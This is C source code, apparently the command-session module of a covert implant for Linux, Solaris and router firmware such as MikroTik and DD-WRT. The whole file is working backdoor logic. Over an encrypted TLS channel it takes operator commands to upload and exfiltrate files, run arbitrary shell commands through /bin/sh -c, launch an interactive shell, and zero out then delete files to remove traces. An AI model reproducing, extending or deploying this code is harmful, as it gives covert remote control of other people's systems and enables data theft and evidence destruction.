#include "client_session.h"
#include "debug.h"
#include "polarssl/crypto.h"

#include "compat.h"

#if defined LINUX || defined SOLARIS
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/wait.h>
#endif

#include "launchshell.h"

#define _USE_32BIT_TIME_T
#define _INC_STAT_INL
#include <sys/stat.h>

static int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut);
static int UploadFile(char* path, unsigned long size, int sock);
static int DownloadFile(char *sath, unsigned long size, int sock);
static int Execute( char *path );
static int DelFile( char *path );
static int ExpandEnvStrings( char* path, char** newpath);
static int SecureDelete( char *path );
static int hstat( int fd );

const unsigned long CMD_TIMEOUT = 5*60*1000; // 5 minutes
const unsigned long PKT_TIMEOUT = 30*1000; // 30 sec.

static havege_state trig_hs;
static ssl_context	trig_ssl;
static ssl_session	trig_ssn;
#define _fstat fstat

//******************************************************************
//***************** Cross Platform functions ***********************
//******************************************************************

unsigned int GenRandomBytes(unsigned char * buf, unsigned int size)
{
	unsigned int i;

	//srand((unsigned int)rand());  NOT NEEDED...

	for (i=0;i<size;i++)
	{
		buf[i] = (unsigned char)(rand() % 255);
	}

	return 0;
}

//******************************************************************
int write_all( int fd, void *ptr, int n )
{
	int		nleft;
	int		nwritten;

	nleft = n;

	while ( nleft > 0 )
	{
		if (( nwritten = write( fd, ptr, nleft )) < 0 )
		{
			// if first time through, error
			if ( nleft == n ) return (-1);
			// else, return what we were successful in writing
			else break;
		}
		else if ( nwritten == 0 )
		{
			break;
		}

		nleft -= nwritten;
		ptr = (char *)ptr + nwritten;
	}

	return ( n - nleft );
}

//******************************************************************
//Waits for data to arrive on the socket and reads it in untill the buffer is full.
int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut)
{
	unsigned long		receivedTotal = 0;
	int					received = 0;
	fd_set				readFDs;
	struct timeval		timeout;

	timeout.tv_sec = timeOut/1000;

	FD_ZERO(&readFDs);

	if(sock != INVALID_SOCKET)
	{
		FD_SET(sock, &readFDs);
	}

	//while there is room in the buffer keep going
	while(receivedTotal < size)
	{
		if( select(sock+1,&readFDs,0,0,&timeout))
		{
//			received = recv(sock,(char*)buf + receivedTotal,size - receivedTotal,0);
			received = crypt_read( &trig_ssl, buf + receivedTotal, size - receivedTotal );

			if(received == SOCKET_ERROR)
			{
				return SOCKET_ERROR;//recv sent back an error
			}


			if(received > 0)
			{
				receivedTotal += received;
			}
			else if(received == 0)
			{
				return receivedTotal;
			}
		}
	}
	return receivedTotal;
}

//******************************************************************
int UploadFile(char* path, unsigned long size, int sock)
{
	REPLY ret;					// Reply struct
	DATA data;					// File transfer Data struct
	unsigned long retVal;
//	D( unsigned long written; )

	FILE* fd;

	// Fill reply with random bytes
 	GenRandomBytes((unsigned char *)&ret, sizeof(ret));

	// Attempt to create local file
	
	fd = fopen(path,"wb");
	if(fd == 0)
	{
		return errno;
	}
	D( printf( " DEBUG: opened path: %s\n", path ); )

	// Set successful reply
	ret.reply = 0;

	retVal = 0;

	//send reply (guessing it lets client know we are ready to receive data of file?)
//	if(SOCKET_ERROR == send(sock,(const char*) &ret, sizeof(REPLY),0))
	// TODO <= 0
	if ( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*) &ret, sizeof(REPLY) ) )
	{
		retVal = -1;
		goto Error;
	}

	D( printf( " DEBUG: Acknowledged UploadFile command of size %d\n", (int)size ); )
	
	while (size)
	{
//		D( printf( " DEBUG: %d bytes remaining\n", (int)size ); )
		// Read 4k block of file data from client
		// minimum is one 4k block
		// TODO: do we need to call Receive() or just call crypt_read() directly??
		if ( SOCKET_ERROR == Receive(sock,(unsigned char*) &data, sizeof(DATA), PKT_TIMEOUT))
			goto Error;
		
		if (size > sizeof(DATA))
		{
			// Write block
			(void) fwrite( data.data, sizeof(DATA), 1, fd );
//			written = fwrite( data.data, sizeof(DATA), 1, fd );
//			D( printf( " DEBUG: %d bytes written\n", (int)written ); )
			size -= sizeof(DATA);
		}
		else
		{
			// Write remaining bytes
			(void) fwrite( data.data, size, 1, fd );
//			written = fwrite( data.data, size, 1, fd );
//			D( printf( " DEBUG: %d bytes written\n", (int)written ); )
			size = 0;
		}
		
	}

	fclose(fd);
	// TODO: what do we want retVal to be? 0 on success?
	return retVal;

Error:
	retVal = -1;
	fclose(fd);
	unlink(path);
	return retVal;
}

//******************************************************************
int DownloadFile(char *path, unsigned long size, int sock)
{
	REPLY ret;		// Reply struct
	DATA data;		// File transfer Data struct
	struct stat buf;
	FILE *fd;

	//TODO: Review and fix/remove this.
	// to silence compiler warnings. this var no longer needed because of the 
	// ssl_context declared global to this file
	sock = sock;

	// Attempt to open local file for download
	fd = fopen( path, "rb" );	

	if ( fd == 0 )
	{
		D( perror( "fopen()"); )
		return errno;
	}

	// Get file size
	// fstat() && stat() do not work on DD-WRT test surrogate for Linux MIPS-LE
//	if( stat( path, &buf ) != 0 )
	if( _fstat( fileno( fd ), &buf ) != 0 )
	{
		D( perror( "fstat()"); )
		goto Error;
	}

	size = buf.st_size;
	if ( size == 0 )
	{
		// double-check size calculation
		size = hstat( fileno( fd ) );
	}

	D( printf( " DEBUG: total fstat() size: %i\n", (int)buf.st_size ); )
	D( printf( " DEBUG: total size: %i\n", (int)size ); )
    //Commented this section out on 8 May 2012, not sure why it was necessary.
	//D( printf( " DEBUG: blocksize for I/O: %i\n", (int)buf.st_blksize ); )
	//D( printf( " DEBUG: number of blks alloc: %i\n", (int)buf.st_blocks ); )
	D( printf( " DEBUG: remote file size is %ld\n", size ); )

	// Setup reply struct
	ret.reply = 0;
	// Place file size in struct padding (Download was a late addition. Hence the hack.)
	ret.padding = htonl(size);

	//send reply with the file size so the client knows
//	if(SOCKET_ERROR == send(sock, (const char*) &ret, sizeof(REPLY), 0))
	if ( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(REPLY) ) )
	{
		D( printf( " ERROR: Socket ERROR\n" ); )
		goto Error;
	}

	while (size)
	{
		if (size > sizeof(DATA))
		{
			(void)fread(&data.data,sizeof(DATA),1,fd);
			// Read block
			size -= sizeof(DATA);
		}
		else
		{
			(void)fread(&data.data,sizeof(DATA),1,fd);
			// Read remaining bytes
			size = 0;
		}

		//write out the file to the client
//		if(SOCKET_ERROR == send(sock,(const char*)(unsigned char*) &data,sizeof(DATA), 0))
		if ( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&data, sizeof(DATA) ) )
		{
			goto Error;
		}
	}

	fclose( fd );
	return 0;

Error:
	fclose( fd );
	return errno;
}

//******************************************************************
int DelFile( char *path )
{
	// Attempt to delete file
	if(unlink(path) < 0)
	{
		return errno;
	}

	return 0;
}

//******************************************************************
// this function should only be called when a target does not support fstat()
// like DD-WRT v24-sp2 std
int hstat( int fd )
{
	int 	fsize = 0;

	// seek to end of file and lseek() will return offset.
	// offset == file size
	if ( ( fsize = lseek( fd, 0, SEEK_END ) ) < 0 )
	{
		D( perror( "lseek(): SEEK_END"); )
		return -1;
	}

	// reset offset back to beginning of the file
	if ( lseek( fd, 0, SEEK_SET ) < 0 )
	{
		D( perror( "lseek(): SEEK_SET"); )
		return -1;
	}

	return fsize;

}

//******************************************************************
int SecureDelete( char *path )
{
	
	FILE* 			fd;
	struct stat 	buf;
	unsigned char	zerobuf[ 4096 ];
	int				remaining;
	int				numWritten;
	int				fsize;

	// Just to make sure
	memset( zerobuf, 0, 4096 );

	//First open the file with the flags f+b
	fd = fopen(path,"r+b");	

	//check to see if file opened
	if(fd == 0)
	{
		D( perror( "fopen()" ); )
		return errno;
	}

	// Get file size
	if( _fstat(fileno(fd),&buf) != 0)
	{
		D( perror( "fstat()" ); )
		goto Error;
	}
	fsize = buf.st_size;
	// for the DD-WRT v24-sp2 (11/02/09) std, fstat() not working correctly.  It will always
	// return buf.st_size == 0.  File still deleted, but not securely.  This presents a greater
	// problem for Download() which relies on fstat() returning a proper file size priot to txfr
	if ( fsize == 0 )
	{
		// double-check size calculation
		fsize = hstat( fileno( fd ) );
	}


	// Loop as necessary while calling fwrite() to write zeroes out to the original file:
	//
	remaining = fsize;
	while ( remaining > 0)
	{
		numWritten   = 0;
		numWritten = fwrite( zerobuf, 1, MIN( 4096, remaining) ,fd);
		if(numWritten <= 0)
		{
			D( perror( "fwrite()");)
			goto Error;
		}
		remaining -= numWritten;
	} 

	fflush(fd); //Flush the CRT buffers... this will send to OS buffers

	//... so flush the OS buffers so that the zeros are actually written to disk

#if defined LINUX || defined SOLARIS
	if ( 0 != fsync( fileno(fd)) ) goto Error;
	if ( 0 != fsync( fileno(fd)) ) goto Error;
	if ( 0 != fsync( fileno(fd)) ) goto Error;

	sync(); sync(); sync();
#endif

	fclose(fd);

#ifdef _USE_UNLINK
	unlink( path );
#else
	if ( remove( path) != 0 )
	{
		// so far, the only platform that has not supported remove() is the
		// DD-WRT v24-sp2 (11/02/09) std firmware flashed to a Linksys
		// WRT54G v1.0 for surrogate testing of MikroTik MIPS-LE.
		// Given prior successful testing with the MikroTik RouterOS on 
		// other hardware, remove() is expected to work.....
		// With DD-WRT, remove() fails with "can't resolve symbol 'remove'"
		D( perror( "remove()" ); )
		goto Error;
	}
#endif

	return 0;

Error:
	fclose( fd );
	return errno;
}

#if 0

int SecureDelete( char *path )
{

	FILE* 			fd;
	struct stat 	buf;
	unsigned char	zerobuf[ 4096 ];
	int				remaining;
	int				bw;

	// Just to make sure
	memset( zerobuf, 0, 4096 );

	//First open the file with the flags f+b
	fd = fopen(path,"r+b");	

	//check to see if file opened
	if(fd == 0)
	{
		D( perror( "fopen()" ); )
			return errno;
	}

	// Get file size
	if( fstat(fileno(fd),&buf) != 0)
	{
		D( perror( "fstat()" ); )
			goto Error;
	}

	remaining = buf.st_size;

	while ( remaining > 0 )
	{
		bw = write_all( fileno( fd ), zerobuf, MIN( 4096, remaining ) );

		// check for errors
		if ( bw < 0 ) return (-1);
		else remaining -= bw;
	}

#if 0
	writebuff = (unsigned char*)malloc( 1);

	if   (writebuff == NULL)
	{
		goto Error;
	}

	writebuff[0] = 0;


	// Loop as necessary while calling fwrite() to write zeroes out to the original file:
	//
	fileSizeRemaining = fsize;
	while (fileSizeRemaining > 0)
	{
		numWritten   = 0;
		numWritten = fwrite( writebuff, 1, 1,fd);
		if( fileSizeRemaining < numWritten)
			break;
		fileSizeRemaining -= numWritten;
	} 
	goto Exit;
#endif

	fclose(fd);
	//		free(writebuff);
	remove( path);
	return 0;

Error:
	fclose( fd );
	return errno;
}
#endif

//******************************************************************
//************** Platform specific functions ***********************
//******************************************************************

#if defined LINUX

unsigned long StartClientSession( int sock )
{
	int fQuit = 0;
	int retval = 0;
	char* commandpath = 0;

	D( printf( "%s:%i\n", __FILE__, __LINE__ ); );
	// we have an established TCP/IP connection
	// although we consider this the SERVER, for the SSL/TLS transaction, 
	// the implant acts as a SSL client
	if ( crypt_setup_client( &trig_hs, &trig_ssl, &trig_ssn, &sock ) != SUCCESS )
	{
		D( printf( "%s:%i: ERROR: crypt_setup_client()\n", __FILE__, __LINE__ ); );
			crypt_cleanup( &trig_ssl);
		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
	}

	// start TLS handshake
	D( printf( "%s:%i\n", __FILE__, __LINE__ ); );
	if ( crypt_handshake(&trig_ssl) != SUCCESS )
	{
		D( printf( "%s:%i ERROR: TLS connection with TLS server failed to initialize.\n", __FILE__, __LINE__ ); );
			crypt_cleanup( &trig_ssl);
		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
	}
	D( printf( "%s:%i TLS handshake complete.\n", __FILE__, __LINE__ ); );


		while(!fQuit)
		{
			COMMAND cmd;
			REPLY ret;

			// Fill reply buffer with random bytes
			GenRandomBytes((unsigned char *)&ret, sizeof(REPLY));

			// Get command struct. Willing to wait 5 minutes between commands

			// set timeout.  if we don't receive a command within this timeframe, assume we are hung and exit
			// this timeout is reset each time a command is received.
#ifdef LINUX
			alarm( SESSION_TIMEOUT );
#endif
			//		Receive(sock, (unsigned char*)&cmd, sizeof(cmd), CMD_TIMEOUT);
			//TODO: Fix this. There's nothing in this loop after removing the WIN32 code.
			if( 0 > crypt_read( &trig_ssl, (unsigned char *)&cmd, sizeof( COMMAND ) ) )
			{
			}
#ifdef LINUX
			alarm( 0 );
#endif

			// Expand the cmd.path to the proper path resolving ENVIRONMENT variables
			if( commandpath != 0 ) 
			{
				free( commandpath );
				commandpath = 0;
			}
			ExpandEnvStrings(cmd.path, &commandpath);

			D( printf( " DEBUG: about to enter case statement to parse command.\n" ); )

				//act on command, THESE FOLLOWING VALUES ARE DEFINED IN THE Shell.h file.
				switch(cmd.command)
			{
				case EXIT:
					D( printf( " DEBUG: EXIT command received.\n" ); )
						fQuit = 1;
					ret.reply = 0;
					break;

				case UPLOAD:
					D( printf( " DEBUG: UPLOAD command received.\n" ); )
						ret.reply = UploadFile(commandpath, ntohl(cmd.size),sock);
					break;

				case DOWNLOAD:
					D( printf( " DEBUG: DOWNLOAD command received.\n" ); )
						ret.reply = DownloadFile(commandpath, ntohl(cmd.size), sock);
					break;

				case EXECUTE:
					D( printf( " DEBUG: EXECUTE command received.\n" ); )
						memset((unsigned char *)&ret, '\0', sizeof(REPLY));    //Clear up the reply...
					ret.reply = Execute( commandpath );
					break;


				case DELETE:
					D( printf( " DEBUG: DELETE command received, attempting SECUREDELETE...\n" ); )
						ret.reply = SecureDelete(commandpath);

					//If SecureDelete failed, ret.reply is not 0 so try to use DelFile function
					if (ret.reply != 0)
					{
						D( printf( " DEBUG: now attempting to UNLINK the file\n" ); )
							ret.reply = DelFile(commandpath);
					}
					break;

				case SHUTDOWNBOTH:
					D( printf( " DEBUG: SHUTDOWN command received.\n" ); )
						fQuit = 1;
					ret.reply = 0;
					crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) );
					//			send(sock, (const char*)&ret, sizeof(ret),0);
					closesocket(sock);
					sock = INVALID_SOCKET;
					retval = SHUTDOWN;
					break;

				case LAUNCHTRUESHELL:
					D( printf( " DEBUG: LAUNCHTRUESHELL command received.\n" ); )
					ret.reply = launchShell(commandpath);
					D( printf( " DEBUG: launchshell() returned %i\n", (int)ret.reply ); )
					break;

					// not reached ???
					goto Exit;

				default:
					D( printf( " DEBUG: command not recognized.\n" ); )
						fQuit = 1;
					break;

			}

			// Send reply
			//		if( SOCKET_ERROR == send(sock, (const char*)&ret, sizeof(ret),0))
			if( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) ) )
			{
				closesocket(sock);
				goto Exit;
			}
		}

		// TODO: Instead of allowing this function to return to connectShell and then trigger_exec where then
		// retval == SHUTDOWN is processed, why not process it here?  it might eliminate some tracing
		// back and forth.
Exit:
		if( commandpath != 0 ) free( commandpath );
		crypt_cleanup( &trig_ssl);

		//_CrtDumpMemoryLeaks();//IAN DELETE LATER IAN COMMENT OR DELETE

		return retval;
}

#endif

#ifdef LINUX

int Execute( char *path )
{
	//Assume success...
	int rv;
	int status=0; 
	pid_t pid;
	char* receivedCommand;
#ifdef _USE_ASH
// and actually, on the MT, /bin/bash is a symbolic link to /bin/ash which is part of /bin/busybox
	char* shell="/bin/ash";
#elif _USE_BASH
	char* shell="/bin/bash";
#else
	char* shell="/bin/sh";
#endif
	receivedCommand = path;

	pid = fork();
	if (pid == 0)
	{
		//This is the child so execute the command...
		execl( shell, shell, "-c", receivedCommand, NULL);
		exit(EXIT_FAILURE);
	}
	else if (pid < 0)
	{
		//The fork failed, report the error;
		status = -1;
	}
	else
	{
		//This is the parent process, Wait for the child to complete.
		rv = waitpid( pid, &status, 0);
		D( printf("\n waitpid returned %d while waiting for pid of %d\n", rv, pid); )
		if (WIFEXITED(status))
		{
			D( printf("\n WIFEXITED = true so child terminated normally.\n"); )
			D( printf("\n WEXITSTATUS(status) = %d\n",WEXITSTATUS(status)); )
		}
		if (WIFSIGNALED(status))
		{
			D( printf("\n WIFSIGNALED = true so child was terminated by a signal.\n"); )
			D( printf("\n Child SIGNAL = %d\n", WTERMSIG(status)); )
		}

	}

	D( printf("\n\n----------\n Debug printout of received Command=%s, status=%i\n----------\n\n", receivedCommand, status); )
	return(status);
}
    
int ExpandEnvStrings( char* path, char** newpath)
{
	int retval = 0;
	*newpath = (char*) malloc( sizeof( ((COMMAND*)0)->path) ); 
	memcpy( *newpath, path, sizeof( ((COMMAND*)0)->path)); 
	return retval;
}

#elif defined SOLARIS

unsigned long StartClientSession( int sock )
{
	int fQuit = 0;
	int retval = 0;
	char* commandpath = 0;

	// we have an established TCP/IP connection
	// although we consider this the SERVER, for the SSL/TLS transaction, 
	// the implant acts as a SSL client
	if ( crypt_setup_client( &trig_hs, &trig_ssl, &trig_ssn, &sock ) != SUCCESS )
	{
		D( printf( " ERROR: crypt_setup_client()\n" ); )
			crypt_cleanup( &trig_ssl);
		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
	}

	// start TLS handshake
	if ( crypt_handshake(&trig_ssl) != SUCCESS )
	{
		D( printf( " ERROR: TLS connection with TLS server failed to initialize.\n" ); )
			crypt_cleanup( &trig_ssl);
		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
	}
	D( printf( " DEBUG: TLS handshake complete.\n" ); )


		while(!fQuit)
		{
			COMMAND cmd;
			REPLY ret;

			// Fill reply buffer with random bytes
			GenRandomBytes((unsigned char *)&ret, sizeof(REPLY));

			// Get command struct. Willing to wait 5 minutes between commands

			// set timeout.  if we don't receive a command within this timeframe, assume we are hung and exit
			// this timeout is reset each time a command is received.
			alarm( SESSION_TIMEOUT );
			//		Receive(sock, (unsigned char*)&cmd, sizeof(cmd), CMD_TIMEOUT);
			crypt_read( &trig_ssl, (unsigned char *)&cmd, sizeof( COMMAND ) );
			alarm( 0 );

			// Expand the cmd.path to the proper path resolving ENVIRONMENT variables
			if( commandpath != 0 ) 
			{
				free( commandpath );
				commandpath = 0;
			}
			ExpandEnvStrings(cmd.path, &commandpath);

			D( printf( " DEBUG: about to enter case statement to parse command.\n" ); )

				//act on command, THESE FOLLOWING VALUES ARE DEFINED IN THE Shell.h file.
				switch(cmd.command)
			{
				case EXIT:
					D( printf( " DEBUG: EXIT command received.\n" ); )
						fQuit = 1;
					ret.reply = 0;
					break;

				case UPLOAD:
					D( printf( " DEBUG: UPLOAD command received.\n" ); )
						ret.reply = UploadFile(commandpath, ntohl(cmd.size),sock);
					break;

				case DOWNLOAD:
					D( printf( " DEBUG: DOWNLOAD command received.\n" ); )
						ret.reply = DownloadFile(commandpath, ntohl(cmd.size), sock);
					break;

				case EXECUTE:
					D( printf( " DEBUG: EXECUTE command received.\n" ); )
						memset((unsigned char *)&ret, '\0', sizeof(REPLY));    //Clear up the reply...
					ret.reply = Execute( commandpath );
					break;


				case DELETE:
					D( printf( " DEBUG: DELETE command received, attempting SECUREDELETE...\n" ); )
						ret.reply = SecureDelete(commandpath);

					//If SecureDelete failed, ret.reply is not 0 so try to use DelFile function
					if (ret.reply != 0)
					{
						D( printf( " DEBUG: now attempting to UNLINK the file\n" ); )
							ret.reply = DelFile(commandpath);
					}
					break;

				case SHUTDOWNBOTH:
					D( printf( " DEBUG: SHUTDOWN command received.\n" ); )
						fQuit = 1;
					ret.reply = 0;
					crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) );
					//			send(sock, (const char*)&ret, sizeof(ret),0);
					closesocket(sock);
					sock = INVALID_SOCKET;
					retval = SHUTDOWN;
					goto Exit;

				case LAUNCHTRUESHELL:
					D( printf( " DEBUG: LAUNCHTRUESHELL command received.\n" ); )
					ret.reply = launchShell(commandpath);
					D( printf( " DEBUG: launchshell() returned %i\n", (int)ret.reply ); )
					break;

				default:
					D( printf( " DEBUG: command not recognized.\n" ); )
						fQuit = 1;
					break;

			}

			// Send reply
			//		if( SOCKET_ERROR == send(sock, (const char*)&ret, sizeof(ret),0))
			if( SOCKET_ERROR == crypt_write( &trig_ssl, (unsigned char*)&ret, sizeof(ret) ) )
			{
				closesocket(sock);
				goto Exit;
			}
		}

		// TODO: Instead of allowing this function to return to connectShell and then trigger_exec where then
		// retval == SHUTDOWN is processed, why not process it here?  it might eliminate some tracing
		// back and forth.
Exit:
		if( commandpath != 0 ) free( commandpath );
		crypt_cleanup( &trig_ssl);

		//_CrtDumpMemoryLeaks();//IAN DELETE LATER IAN COMMENT OR DELETE

		return retval;
}

int Execute( char *path )
{
	//Assume success...
	int rv;
	int status=0; 
	pid_t pid;
	char* receivedCommand;
	char* shell="/bin/sh";
	receivedCommand = path;

	pid = fork();
	if (pid == 0)
	{
		//This is the child so execute the command...
		execl( shell, shell, "-c", receivedCommand, NULL);
		exit(EXIT_FAILURE);
	}
	else if (pid < 0)
	{
		//The fork failed, report the error;
		status = -1;
	}
	else
	{
		//This is the parent process, Wait for the child to complete.
		rv = waitpid( pid, &status, 0);
		D( printf("\n waitpid returned %d while waiting for pid of %d\n", rv, (int)pid); )
		if (WIFEXITED(status))
		{
			D( printf("\n WIFEXITED = true so child terminated normally.\n"); )
			D( printf("\n WEXITSTATUS(status) = %d\n",WEXITSTATUS(status)); )
		}
		if (WIFSIGNALED(status))
		{
			D( printf("\n WIFSIGNALED = true so child was terminated by a signal.\n"); )
			D( printf("\n Child SIGNAL = %d\n", WTERMSIG(status)); )
		}

	}

	D( printf("\n\n----------\n Debug printout of received Command=%s, status=%i\n----------\n\n", receivedCommand, status); )
	return(status);
}

int ExpandEnvStrings( char* path, char** newpath)
{
	// TODO: validate
	int retval = 0;
	*newpath = (char*) malloc( sizeof( ((COMMAND*)0)->path) ); 
	memcpy( *newpath, path, sizeof( ((COMMAND*)0)->path)); 
	return retval;
}
#endif
